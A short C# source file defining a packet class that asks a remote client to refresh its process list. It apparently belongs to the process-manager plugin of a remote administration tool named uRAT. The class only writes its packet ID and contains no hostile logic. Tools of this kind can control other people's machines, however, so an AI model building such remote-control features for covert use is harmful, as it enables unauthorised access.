using System;
using System.IO;
using uNet2.Packet;

namespace uRAT.ManagersClientPlugin.ProcessManager.Packets
{
    class RefreshProcessesPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 4; }
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
        }

        public void DeserializeFrom(Stream stream)
        {

        }
    }
}
